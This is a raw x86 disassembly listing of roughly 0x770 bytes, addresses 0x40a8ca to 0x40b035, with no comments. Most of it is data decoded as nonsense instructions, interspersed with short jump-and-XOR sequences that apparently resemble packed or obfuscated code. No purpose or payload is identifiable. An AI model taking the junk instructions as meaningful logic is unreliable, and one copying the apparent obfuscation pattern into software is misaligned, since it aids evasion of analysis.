  40a8ca:	test   BYTE PTR [ecx-0xd],0x91
  40a8ce:	aaa    
  40a8cf:	popf   
  40a8d0:	dec    edi
  40a8d1:	aas    
  40a8d2:	scas   al,BYTE PTR es:[edi]
  40a8d3:	aam    0xbf
  40a8d5:	out    0x1a,eax
  40a8d7:	sahf   
  40a8d8:	sbb    BYTE PTR [eax-0x17],cl
  40a8db:	hlt    
  40a8dc:	jge    0x40a8ca
  40a8de:	int3   
  40a8df:	test   ah,al
  40a8e1:	push   ds
  40a8e2:	ins    DWORD PTR es:[edi],dx
  40a8e3:	inc    esp
  40a8e4:	and    eax,0xa4c6e03d
  40a8e9:	int    0x64
  40a8eb:	das    
  40a8ec:	pop    ecx
  40a8ed:	xor    BYTE PTR [eax+esi*2],cl
  40a8f0:	xchg   ecx,eax
  40a8f1:	push   eax
  40a8f2:	sub    DWORD PTR [ebx-0x39313f1d],ebx
  40a8f8:	imul   edi,DWORD PTR [ebx+0x281559d9],0xa511da3f
  40a902:	(bad)  [ebp-0xb]
  40a905:	or     DWORD PTR [edi-0x48],esp
  40a908:	daa    
  40a909:	aas    
  40a90a:	cmc    
  40a90b:	pushf  
  40a90c:	jnp    0x40a89f
  40a90e:	call   0xc7ec45f0
  40a913:	fbld   TBYTE PTR [ebx+0x29b7dd0a]
  40a919:	stos   BYTE PTR es:[edi],al
  40a91a:	xor    dl,BYTE PTR [edi-0x6cc4f3cd]
  40a920:	mov    DWORD PTR [ebp-0x77],edi
  40a923:	cmp    BYTE PTR [ebx+0x5d8bec45],cl
  40a929:	clc    
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    edx,edx
  40a948:	ins    DWORD PTR es:[edi],dx
  40a949:	adc    edi,DWORD PTR [edi-0x26]
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a95f
  40a954:	fwait
  40a955:	cwde   
  40a956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a957:	xchg   DWORD PTR [ecx+0xc],ecx
  40a95a:	adc    esp,DWORD PTR [ebp+ebx*4-0x2f770386]
  40a961:	sbb    al,0xc1
  40a963:	cmovno ebp,ebx
  40a966:	sahf   
  40a967:	ins    BYTE PTR es:[edi],dx
  40a968:	inc    eax
  40a969:	(bad)  
  40a96a:	push   ebx
  40a96b:	aad    0xf7
  40a96d:	pushf  
  40a96e:	ss jg  0x40a9b0
  40a971:	push   0xffffffd9
  40a973:	pop    edx
  40a974:	jbe    0x40a93d
  40a976:	xchg   esp,eax
  40a977:	test   DWORD PTR [ebx],edi
  40a979:	stos   BYTE PTR es:[edi],al
  40a97a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a97b:	jo     0x40a93f
  40a97d:	or     DWORD PTR [eax],ebx
  40a97f:	sub    al,0xb2
  40a981:	and    dl,BYTE PTR [eax]
  40a983:	imul   edi,ecx,0xffffffb9
  40a986:	pop    edi
  40a987:	rcl    DWORD PTR [eax-0x21f2508f],0xb2
  40a98e:	pop    es
  40a98f:	lds    edx,FWORD PTR [eax]
  40a991:	ins    DWORD PTR es:[edi],dx
  40a992:	pop    esp
  40a993:	jns    0x40a916
  40a995:	aad    0xbc
  40a997:	dec    ecx
  40a998:	scas   al,BYTE PTR es:[edi]
  40a999:	or     ebx,0xffffff84
  40a99c:	jnp    0x40aa19
  40a99e:	out    dx,al
  40a99f:	shr    BYTE PTR [esi+0x33],cl
  40a9a2:	adc    BYTE PTR [ecx-0x7e],0x2a
  40a9a6:	in     eax,0x8f
  40a9a8:	in     eax,dx
  40a9a9:	push   edx
  40a9aa:	ja     0x40a99d
  40a9ac:	ja     0x40a9e9
  40a9ae:	(bad)  
  40a9af:	hlt    
  40a9b0:	dec    esi
  40a9b1:	jmp    0xb5fa:0x634eb696
  40a9b8:	mov    ch,0x2e
  40a9ba:	push   es
  40a9bb:	popf   
  40a9bc:	xor    DWORD PTR [esi-0x4bfcfa46],edi
  40a9c2:	mov    DWORD PTR [eax-0xe079925],edx
  40a9c8:	push   ebp
  40a9c9:	adc    eax,0xfe5473fc
  40a9ce:	idiv   DWORD PTR [ecx-0x290cb664]
  40a9d4:	lock pop edi
  40a9d6:	cmp    ecx,DWORD PTR es:[eax+edi*4]
  40a9da:	addr16 popf 
  40a9dc:	sub    dh,0x63
  40a9df:	lods   al,BYTE PTR ds:[esi]
  40a9e0:	lods   al,BYTE PTR ds:[esi]
  40a9e1:	mov    DWORD PTR [esi-0x4614846a],eax
  40a9e7:	enter  0x9f29,0x39
  40a9eb:	shl    BYTE PTR [ebx],cl
  40a9ed:	repnz pop es
  40a9ef:	xor    DWORD PTR [edx+0x29],esp
  40a9f2:	in     eax,dx
  40a9f3:	mov    ch,dl
  40a9f5:	pop    es
  40a9f6:	cmp    ch,BYTE PTR [edx]
  40a9f8:	aad    0x76
  40a9fa:	test   al,ah
  40a9fc:	inc    eax
  40a9fd:	out    0x5d,eax
  40a9ff:	inc    ebx
  40aa00:	popf   
  40aa01:	in     al,dx
  40aa02:	out    0x6f,eax
  40aa04:	inc    ecx
  40aa05:	popf   
  40aa06:	sbb    eax,0x2ed0371b
  40aa0b:	dec    ebp
  40aa0c:	dec    esi
  40aa0d:	adc    eax,0x84daa3ba
  40aa12:	cld    
  40aa13:	mov    ah,0x6
  40aa15:	faddp  st(6),st
  40aa17:	shl    DWORD PTR [ebx+0x33],cl
  40aa1a:	jb     0x40a9da
  40aa1c:	cmp    BYTE PTR [esi],bh
  40aa1e:	jb     0x40aa6c
  40aa20:	ficomp DWORD PTR [ecx-0x62143f35]
  40aa26:	pushf  
  40aa27:	fsub   DWORD PTR [ecx-0x52]
  40aa2a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa2c:	pop    edi
  40aa2d:	pushf  
  40aa2e:	lock dec eax
  40aa30:	pop    ebp
  40aa31:	out    0xc,eax
  40aa33:	retf   0x3cdd
  40aa36:	pushf  
  40aa37:	pop    ss
  40aa38:	push   esp
  40aa39:	cmp    edx,edx
  40aa3b:	daa    
  40aa3c:	adc    DWORD PTR [esi+0x627edef1],ebp
  40aa42:	ds push ecx
  40aa44:	cli    
  40aa45:	icebp  
  40aa46:	cmp    bl,al
  40aa48:	push   ebp
  40aa49:	int3   
  40aa4a:	dec    edi
  40aa4b:	inc    edx
  40aa4c:	jge    0x40aa89
  40aa4e:	inc    eax
  40aa4f:	cwde   
  40aa50:	pop    esp
  40aa51:	leave  
  40aa52:	in     eax,dx
  40aa53:	rol    BYTE PTR [eax],1
  40aa55:	pop    edi
  40aa56:	fs pop ebp
  40aa58:	and    al,0x69
  40aa5a:	out    dx,eax
  40aa5b:	cmp    eax,0x16521c53
  40aa60:	or     ebx,DWORD PTR [esi+0x6285d380]
  40aa66:	fucompp 
  40aa68:	mov    edx,gs
  40aa6a:	ror    BYTE PTR ds:0x27c7fd88,cl
  40aa70:	repnz fsubrp st(5),st
  40aa73:	cmp    al,0x42
  40aa75:	mov    BYTE PTR [esi-0x6a448613],cl
  40aa7b:	pop    edx
  40aa7c:	test   BYTE PTR [edx],ch
  40aa7e:	adc    eax,0x50ebea58
  40aa83:	push   ecx
  40aa84:	sbb    DWORD PTR [edx-0x5c923c8b],edi
  40aa8a:	ja     0x40aa43
  40aa8c:	inc    ecx
  40aa8d:	je     0x40aa60
  40aa8f:	call   0x8ae6fdd
  40aa94:	int    0xb5
  40aa96:	ins    DWORD PTR es:[edi],dx
  40aa97:	jb     0x40aa57
  40aa99:	adc    ebx,edx
  40aa9b:	or     eax,0x683f2790
  40aaa0:	push   0x3b
  40aaa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa3:	add    eax,0xb15e8036
  40aaa8:	dec    esp
  40aaa9:	gs jne 0x40aa90
  40aaac:	and    eax,0x19edbf43
  40aab1:	sbb    DWORD PTR [ebx+0x1f0c206b],ecx
  40aab7:	adc    al,0x8f
  40aab9:	cmp    al,0xbf
  40aabb:	mov    dl,0xa8
  40aabd:	jge    0x40aa89
  40aabf:	jmp    0x895a65fa
  40aac4:	je     0x40aaf8
  40aac6:	pop    ecx
  40aac7:	mov    ah,BYTE PTR [edi+0xddfa8cf]
  40aacd:	das    
  40aace:	jae    0x40aa76
  40aad0:	test   al,0x19
  40aad2:	les    esp,FWORD PTR [esi+0x70f62cd3]
  40aad8:	gs cmc 
  40aada:	mov    bh,0xfb
  40aadc:	adc    di,sp
  40aadf:	mov    al,ds:0xd096f889
  40aae4:	mov    ?,WORD PTR [ecx]
  40aae6:	enter  0x1d78,0xbc
  40aaea:	xor    eax,0x546c7e16
  40aaef:	mov    ecx,0x85cb7081
  40aaf4:	push   eax
  40aaf5:	fsub   st(6),st
  40aaf7:	dec    esp
  40aaf8:	inc    ebp
  40aaf9:	ss and al,0xd0
  40aafc:	inc    ebp
  40aafd:	pop    ecx
  40aafe:	loop   0x40aaa7
  40ab00:	jg     0x40aa90
  40ab02:	adc    DWORD PTR [ebx],esp
  40ab04:	fisubr WORD PTR [eax]
  40ab06:	stos   BYTE PTR es:[edi],al
  40ab07:	or     al,0xc2
  40ab09:	or     BYTE PTR [ebp+0x59],bh
  40ab0c:	pushf  
  40ab0d:	xor    DWORD PTR [eax-0x5d842555],eax
  40ab13:	sbb    al,BYTE PTR [edi]
  40ab15:	iret   
  40ab16:	loop   0x40aad4
  40ab18:	(bad)  
  40ab19:	out    0x5a,eax
  40ab1b:	cmp    DWORD PTR [edx],edx
  40ab1d:	fsubr  DWORD PTR [ebp-0x13]
  40ab20:	and    ebp,DWORD PTR [ebx+0x245353e1]
  40ab26:	cmp    dl,BYTE PTR [ecx+0x3cfac7f9]
  40ab2c:	lods   al,BYTE PTR ds:[esi]
  40ab2d:	and    al,0x6
  40ab2f:	pop    edx
  40ab30:	(bad)  
  40ab31:	cmp    bl,BYTE PTR [esi+0x37]
  40ab34:	adc    DWORD PTR [ebx-0x3b],0x5cccdc58
  40ab3b:	jno    0x40aadf
  40ab3d:	(bad)  
  40ab3e:	sar    BYTE PTR [ecx+edi*1],1
  40ab41:	cs sbb al,0x68
  40ab44:	cmp    al,0xb4
  40ab46:	ret    
  40ab47:	sbb    dh,BYTE PTR [eax-0x44]
  40ab4a:	push   ds
  40ab4b:	jae    0x40ab94
  40ab4d:	sub    DWORD PTR [ebp-0x3a],edi
  40ab50:	out    0x44,eax
  40ab52:	inc    edx
  40ab53:	test   eax,0xdbd5f0d
  40ab58:	add    DWORD PTR [edx-0x31],edx
  40ab5b:	stos   BYTE PTR es:[edi],al
  40ab5c:	js     0x40abba
  40ab5e:	ins    BYTE PTR es:[edi],dx
  40ab5f:	outs   dx,BYTE PTR gs:[esi]
  40ab61:	retf   0x58f
  40ab64:	mov    esi,0x8c1750be
  40ab69:	cld    
  40ab6a:	into   
  40ab6b:	repnz sbb al,al
  40ab6e:	fptan  
  40ab70:	sbb    al,0x9b
  40ab72:	adc    edx,DWORD PTR [ebx]
  40ab74:	mov    al,0x81
  40ab76:	sub    eax,0xae3a6b7b
  40ab7b:	add    bl,BYTE PTR [edi]
  40ab7d:	mov    dh,0x7f
  40ab7f:	jmp    0x2ea483b3
  40ab84:	lods   eax,DWORD PTR ds:[esi]
  40ab85:	in     al,dx
  40ab86:	mov    ebp,0xc7e303e
  40ab8b:	out    dx,eax
  40ab8c:	add    ebp,edi
  40ab8e:	fild   DWORD PTR [edi+0x73b7b254]
  40ab94:	nop
  40ab95:	sub    ah,ch
  40ab97:	or     al,0x11
  40ab99:	int    0x4e
  40ab9b:	and    BYTE PTR [esi-0x29],cl
  40ab9e:	rcl    BYTE PTR [eax+0x79e02dc0],0xd0
  40aba5:	mov    ebp,0xffd5baff
  40abaa:	jge    0x40ab97
  40abac:	mov    cs,WORD PTR [eax+ebp*2+0x5d4ad7f1]
  40abb3:	jl     0x450a9af4
  40abb9:	jo     0x40abc6
  40abbb:	mov    ebp,0x10aa79e1
  40abc0:	mov    ch,0x53
  40abc2:	mov    bl,0xcd
  40abc4:	loopne 0x40aba6
  40abc6:	fs mov cl,0x2e
  40abc9:	mov    esp,esi
  40abcb:	mov    cl,0xfc
  40abcd:	inc    ebx
  40abce:	imul   ebp,DWORD PTR [ecx-0x7800c2a8],0xffffff82
  40abd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abd6:	xchg   esi,eax
  40abd7:	pop    esp
  40abd8:	add    al,BYTE PTR [ecx-0x6e]
  40abdb:	inc    edi
  40abdc:	push   es
  40abdd:	mov    al,0x2a
  40abdf:	sub    dh,BYTE PTR [eax+0x24ee74ba]
  40abe5:	dec    ebx
  40abe6:	mov    edi,0x116c0ed0
  40abeb:	and    eax,0x55901857
  40abf0:	push   ds
  40abf1:	test   eax,0x1c1baddb
  40abf6:	push   edx
  40abf7:	ins    DWORD PTR es:[edi],dx
  40abf8:	in     eax,dx
  40abf9:	push   ecx
  40abfa:	jns    0x40ac7a
  40abfc:	push   DWORD PTR [edx+0x747c268b]
  40ac02:	dec    ecx
  40ac03:	mov    ah,0x88
  40ac05:	dec    edx
  40ac06:	out    dx,eax
  40ac07:	ror    DWORD PTR [ecx+ebp*4],0x27
  40ac0b:	adc    BYTE PTR [esi+ecx*8+0x19],dh
  40ac0f:	pop    ecx
  40ac10:	pop    eax
  40ac11:	fstp   DWORD PTR [ebx+ebp*8+0x2a]
  40ac15:	dec    eax
  40ac16:	pop    edi
  40ac17:	fistp  DWORD PTR [edi]
  40ac19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac1a:	jns    0x40abfa
  40ac1c:	cdq    
  40ac1d:	cmp    DWORD PTR [esi+0x25],esp
  40ac20:	jecxz  0x40ac98
  40ac22:	or     eax,0x1e6e3774
  40ac28:	fstp   TBYTE PTR [ebx+0x4e]
  40ac2b:	out    dx,al
  40ac2c:	adc    esp,DWORD PTR [esi+0x4ffaf43c]
  40ac32:	fnstsw WORD PTR [ebp+0x11c7dd92]
  40ac38:	pusha  
  40ac39:	jne    0x40ac24
  40ac3b:	xchg   ecx,eax
  40ac3c:	pop    ebx
  40ac3d:	adc    dl,BYTE PTR [ecx+esi*4-0x602b23d9]
  40ac44:	push   ebx
  40ac45:	(bad)  
  40ac46:	scas   eax,DWORD PTR es:[edi]
  40ac47:	outs   dx,DWORD PTR ds:[esi]
  40ac48:	dec    ebx
  40ac49:	mov    eax,0x118ca8e1
  40ac4e:	mov    ds:0xd233d933,eax
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	pxor   mm1,QWORD PTR [eax-0x80]
  40ac8f:	mov    esi,edx
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac6f
  40ac99:	mov    ebp,DWORD PTR [edx+0x42]
  40ac9c:	stos   BYTE PTR es:[edi],al
  40ac9d:	scas   eax,DWORD PTR es:[edi]
  40ac9e:	(bad)  
  40aca0:	mov    al,0x14
  40aca2:	loope  0x40ac32
  40aca4:	jl     0x40ad1e
  40aca6:	(bad)  
  40aca7:	(bad)  
  40aca8:	pop    esi
  40aca9:	push   0xf
  40acab:	retf   0xba1f
  40acae:	imul   ebx,DWORD PTR [edx+ecx*1-0x7b98896a],0xd4068ab1
  40acb9:	stos   BYTE PTR es:[edi],al
  40acba:	push   ecx
  40acbb:	idiv   BYTE PTR [ecx-0x11961d50]
  40acc1:	sub    BYTE PTR [eax-0x66],dh
  40acc4:	inc    edi
  40acc5:	mov    esi,edi
  40acc7:	jmp    0x1bf66633
  40accc:	or     eax,0x8664f395
  40acd1:	cmp    DWORD PTR [ebp-0x51],edi
  40acd4:	xchg   ecx,eax
  40acd5:	dec    ebp
  40acd6:	pop    ebx
  40acd7:	inc    edx
  40acd8:	(bad)  
  40acd9:	or     bl,bl
  40acdb:	dec    edi
  40acdc:	push   ebp
  40acdd:	jge    0x40ad22
  40acdf:	adc    bh,BYTE PTR [ecx+0x746d12e4]
  40ace5:	push   es
  40ace6:	shl    BYTE PTR [ebx*2+0x1eebc018],cl
  40aced:	mov    eax,0xf85189c5
  40acf2:	in     eax,0x48
  40acf4:	fstp   TBYTE PTR [ebx-0xf]
  40acf7:	xchg   edx,eax
  40acf8:	aas    
  40acf9:	mov    eax,ds:0x4160fa4a
  40acfe:	into   
  40acff:	es ins DWORD PTR es:[edi],dx
  40ad01:	mov    edx,DWORD PTR [esi-0x75fae69c]
  40ad07:	pop    esp
  40ad08:	outs   dx,DWORD PTR ds:[esi]
  40ad09:	call   0xcf49:0x8f690c76
  40ad10:	aad    0x59
  40ad12:	mov    edi,0x45fe44e
  40ad17:	pop    es
  40ad18:	mov    dl,0x31
  40ad1a:	add    ch,BYTE PTR [ebx-0x49]
  40ad1d:	xor    eax,0xa10cd9fe
  40ad22:	sub    eax,0x8f256464
  40ad27:	xchg   ecx,eax
  40ad28:	add    DWORD PTR [ebx-0x19],ebp
  40ad2b:	je     0x40ad22
  40ad2d:	push   ss
  40ad2e:	xor    al,0x9e
  40ad30:	add    DWORD PTR [edx],ecx
  40ad32:	xor    DWORD PTR ds:0x9099dbc8,ebx
  40ad38:	cmp    al,0xf1
  40ad3a:	pop    es
  40ad3b:	mov    bh,BYTE PTR [edi-0x1d]
  40ad3e:	mov    ecx,0x5eeff34c
  40ad43:	popf   
  40ad44:	loop   0x40ad3b
  40ad46:	mov    al,0xcd
  40ad48:	in     eax,0xe7
  40ad4a:	jecxz  0x40ad37
  40ad4c:	cmp    BYTE PTR [ecx+ecx*4+0x7c],dh
  40ad50:	dec    esi
  40ad51:	jnp    0x40ad5f
  40ad53:	mov    cs,WORD PTR [esi-0x7e]
  40ad56:	cdq    
  40ad57:	lea    edi,[ecx-0x7a]
  40ad5a:	es dec esi
  40ad5c:	xor    eax,0xa775de24
  40ad61:	adc    eax,0xc0d15be1
  40ad66:	cmc    
  40ad67:	pop    esi
  40ad68:	cs cli 
  40ad6a:	out    dx,eax
  40ad6b:	and    BYTE PTR [ebp-0x26b0a9b0],cl
  40ad71:	bound  eax,QWORD PTR [ebx-0x2f]
  40ad74:	xchg   edx,esp
  40ad76:	jo     0x40ade2
  40ad78:	pop    ss
  40ad79:	mov    ds:0x5169ccb3,al
  40ad7e:	push   0xffffffaf
  40ad80:	out    dx,eax
  40ad81:	dec    ecx
  40ad82:	mov    al,0x47
  40ad84:	not    BYTE PTR [edx]
  40ad86:	test   al,0x9
  40ad88:	dec    eax
  40ad89:	ins    DWORD PTR es:[edi],dx
  40ad8a:	cmp    al,0x18
  40ad8c:	mov    bh,0xab
  40ad8e:	xor    DWORD PTR [ecx],ecx
  40ad90:	ret    
  40ad91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad92:	and    eax,0x94fe706b
  40ad97:	loope  0x40ad2d
  40ad99:	pop    esp
  40ad9a:	idiv   BYTE PTR [esi+0x18097c5a]
  40ada0:	es xchg ebp,eax
  40ada2:	fwait
  40ada3:	pop    ss
  40ada4:	cli    
  40ada5:	js     0x40ada9
  40ada7:	jne    0x40adff
  40ada9:	adc    al,0x62
  40adab:	out    0x93,eax
  40adad:	popa   
  40adae:	dec    edi
  40adaf:	ja     0x40adb2
  40adb1:	pop    esp
  40adb2:	into   
  40adb3:	mov    ds:0x79ce5972,al
  40adb8:	popa   
  40adb9:	dec    ebx
  40adba:	das    
  40adbb:	add    al,0xfe
  40adbd:	lock inc esi
  40adbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adc0:	std    
  40adc1:	repz mov ch,0x8e
  40adc4:	jnp    0x40ada9
  40adc6:	sbb    ch,BYTE PTR [ebp+0x5f83baf9]
  40adcc:	jmp    0x40ad9f
  40adce:	adc    al,BYTE PTR [esi]
  40add0:	iret   
  40add1:	ds pop edi
  40add3:	mov    eax,0x1edaccaf
  40add8:	icebp  
  40add9:	loopne 0x40ae52
  40addb:	mov    ecx,0xd950cda6
  40ade0:	push   esi
  40ade1:	retf   0xfeb6
  40ade4:	ds push 0xfdf17f84
  40adea:	xchg   esp,eax
  40adeb:	cmp    al,bl
  40aded:	mov    eax,0x88607bbe
  40adf2:	mov    WORD PTR [edx+0x791280dd],ds
  40adf8:	xor    al,BYTE PTR [ecx-0x46]
  40adfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adfc:	es loop 0x40ae6d
  40adff:	dec    esi
  40ae00:	mov    ecx,0x39e44a32
  40ae05:	xchg   ebp,eax
  40ae06:	(bad)  
  40ae07:	cli    
  40ae08:	daa    
  40ae09:	and    ah,cl
  40ae0b:	pop    edi
  40ae0c:	xor    ah,cl
  40ae0e:	push   ebp
  40ae0f:	mov    dh,0x29
  40ae11:	shl    BYTE PTR [ebx+ecx*8-0x42708339],cl
  40ae18:	jae    0x40ae62
  40ae1a:	inc    ebx
  40ae1b:	fisubr DWORD PTR [esi+0x61]
  40ae1e:	push   es
  40ae1f:	cdq    
  40ae20:	dec    esi
  40ae21:	dec    edi
  40ae22:	or     DWORD PTR [esi+0x1da9a608],edx
  40ae28:	gs sahf 
  40ae2a:	stc    
  40ae2b:	nop
  40ae2c:	xor    edi,ecx
  40ae2e:	jbe    0x40adb1
  40ae30:	jmp    0xe34e:0x96d5435a
  40ae37:	and    DWORD PTR [esi],esi
  40ae39:	ja     0x40ae56
  40ae3b:	pop    esi
  40ae3c:	xchg   BYTE PTR [edi],dh
  40ae3e:	in     al,dx
  40ae3f:	aam    0x82
  40ae41:	xchg   edi,eax
  40ae42:	inc    esi
  40ae43:	mov    esi,0x93e0efc
  40ae48:	adc    BYTE PTR [esi],cl
  40ae4a:	imul   eax,DWORD PTR [edx+0x61],0xfffffffb
  40ae4e:	and    dh,0xe9
  40ae51:	xchg   esi,eax
  40ae52:	fnstcw WORD PTR [ebp-0x4b]
  40ae55:	pop    ebx
  40ae56:	jmp    FWORD PTR [ebx]
  40ae58:	imul   esp,DWORD PTR [edi+edi*2+0x4428d3fe],0xf7ae08ed
  40ae63:	in     eax,0xbb
  40ae65:	mov    esp,0xf95e0365
  40ae6a:	test   al,0x63
  40ae6c:	in     al,0x38
  40ae6e:	inc    esp
  40ae6f:	push   ebp
  40ae70:	imul   esi,DWORD PTR [edi+edx*4],0xb9808ec1
  40ae77:	out    0x96,al
  40ae79:	add    BYTE PTR [ebp-0x44d05705],0x98
  40ae80:	pop    ds
  40ae81:	pop    eax
  40ae82:	and    eax,0xe0039f1f
  40ae87:	sub    BYTE PTR [esi+0x75],bl
  40ae8a:	cmp    al,0xd1
  40ae8c:	inc    ebp
  40ae8d:	pop    edi
  40ae8e:	inc    esp
  40ae8f:	nop
  40ae90:	xor    al,0x72
  40ae92:	out    dx,eax
  40ae93:	sar    ebp,1
  40ae95:	jle    0x40ae43
  40ae97:	mov    ebx,0x8a614e4d
  40ae9c:	inc    BYTE PTR [ebx]
  40ae9e:	repz mov eax,0x8c6fce6d
  40aea4:	ins    BYTE PTR es:[edi],dx
  40aea5:	mov    ebp,0x190e9bab
  40aeaa:	xor    ebp,DWORD PTR [ebx]
  40aeac:	shl    DWORD PTR [esi-0x6b9bf135],cl
  40aeb2:	popa   
  40aeb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeb4:	xchg   ebp,eax
  40aeb5:	push   edi
  40aeb6:	jmp    0x40ae40
  40aeb8:	ror    bl,cl
  40aeba:	int    0x92
  40aebc:	mov    ebx,0x6f95fce3
  40aec1:	push   DWORD PTR [ebp+esi*4+0x40]
  40aec5:	adc    eax,0xb4b25dd7
  40aeca:	adc    al,0xa5
  40aecc:	adc    eax,0xe426e29d
  40aed1:	fmul   QWORD PTR ds:0x1a41bade
  40aed7:	and    eax,0x8f5d4bf8
  40aedc:	sbb    cl,BYTE PTR [esi-0x1485b761]
  40aee2:	add    al,0x43
  40aee4:	cmc    
  40aee5:	mov    al,0xa6
  40aee7:	ds sti 
  40aee9:	xchg   esi,eax
  40aeea:	test   dl,dl
  40aeec:	pop    esi
  40aeed:	push   edx
  40aeee:	mov    eax,ds:0x4f6f5468
  40aef3:	call   0x50a9:0xea8e0361
  40aefa:	adc    al,0x87
  40aefc:	xchg   ecx,ecx
  40aefe:	push   esp
  40aeff:	idiv   eax
  40af01:	sub    DWORD PTR [ebp+0x41],edx
  40af04:	or     ebp,ebp
  40af06:	lock loope 0x40af5e
  40af09:	add    eax,0x14a4cea5
  40af0e:	cwde   
  40af0f:	pop    ebp
  40af10:	push   ds
  40af11:	cmp    bl,bh
  40af13:	nop
  40af14:	push   0xfdd35f0b
  40af19:	sub    al,0x99
  40af1b:	fnstsw WORD PTR [ebx]
  40af1d:	or     dl,bh
  40af1f:	mov    dl,0xa2
  40af21:	jbe    0x40af69
  40af23:	inc    ebp
  40af24:	jg     0x40aea7
  40af26:	xor    al,0xbf
  40af28:	test   al,0x61
  40af2a:	ret    0x41dd
  40af2d:	xor    DWORD PTR [esi+0x44],0xfffffff3
  40af31:	mov    ecx,0xef2ebbfd
  40af36:	mov    edi,0xba3f3b44
  40af3b:	jmp    0xb51c:0xf7acd7f4
  40af42:	jnp    0x40aef0
  40af44:	push   ss
  40af45:	sbb    BYTE PTR [edx-0x22],0x44
  40af49:	mov    dl,0x5b
  40af4b:	sub    eax,0x14e82fa0
  40af50:	pushf  
  40af51:	(bad)  
  40af52:	mov    fs,WORD PTR [edx-0x7e]
  40af55:	xchg   DWORD PTR [esi+eiz*1+0x20],eax
  40af59:	mov    al,ds:0x2dadc28e
  40af5e:	adc    BYTE PTR [edx-0x7d11a3a],ch
  40af64:	cmp    BYTE PTR [edi-0x1b],cl
  40af67:	int3   
  40af68:	(bad)  
  40af69:	xchg   ebp,eax
  40af6a:	add    BYTE PTR [eax-0x6f],cl
  40af6d:	add    ebx,esp
  40af6f:	xor    eax,0x2c857099
  40af74:	or     al,0x66
  40af76:	retf   0x6d6d
  40af79:	(bad)  
  40af7a:	mov    ebp,0xae9c152d
  40af7f:	push   0xd84b0877
  40af84:	jle    0x40afd9
  40af86:	fwait
  40af87:	and    dh,al
  40af89:	cmp    eax,0x5f8542c2
  40af8e:	and    DWORD PTR [ebp+0x6d36115a],ebx
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	xor    eax,0xd267697c
  40afb7:	test   DWORD PTR [eax+0x78],edi
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	and    bh,BYTE PTR [ebx+0x22]
  40afc1:	push   edi
  40afc2:	pop    esp
  40afc3:	cmc    
  40afc4:	test   al,0xac
  40afc6:	cmp    eax,0x231db7c
  40afcb:	shl    BYTE PTR [edx+0x7],0xf5
  40afcf:	cmc    
  40afd0:	inc    ecx
  40afd1:	lods   al,BYTE PTR ds:[esi]
  40afd2:	stos   BYTE PTR es:[edi],al
  40afd3:	les    ebp,FWORD PTR [edi-0x21]
  40afd6:	mov    dh,0xdc
  40afd8:	test   BYTE PTR [ebx-0x27],dl
  40afdb:	add    ch,BYTE PTR [esi+0x21]
  40afde:	std    
  40afdf:	gs ret 0x3a9
  40afe3:	out    0xa4,eax
  40afe5:	add    ebx,DWORD PTR [esi+0x1d]
  40afe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afe9:	push   esp
  40afea:	(bad)  
  40afec:	(bad)  
  40afed:	lea    esi,[ebx+0x733b15dd]
  40aff3:	inc    ebx
  40aff4:	mov    edx,0x7a841f6b
  40aff9:	pop    ebp
  40affa:	retf   0xfe58
  40affd:	mov    es,WORD PTR [esi]
  40afff:	mov    ch,0x67
  40b001:	sbb    BYTE PTR [ecx+0x64f7c31f],bl
  40b007:	push   ecx
  40b008:	loopne 0x40af8b
  40b00a:	cmp    eax,0x7ae9055d
  40b00f:	mov    ch,BYTE PTR [esi-0x7a8ca12f]
  40b015:	in     eax,0x90
  40b017:	jmp    0x4397:0x8732bd84
  40b01e:	push   eax
  40b01f:	sub    ebp,DWORD PTR [edx-0x4a6caa7a]
  40b025:	mov    eax,0xa3cfc7e4
  40b02a:	sbb    esi,esi
  40b02c:	addr16 daa 
  40b02e:	and    eax,0xf3950b0b
  40b033:	dec    esi
  40b034:	push   eax
  40b035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
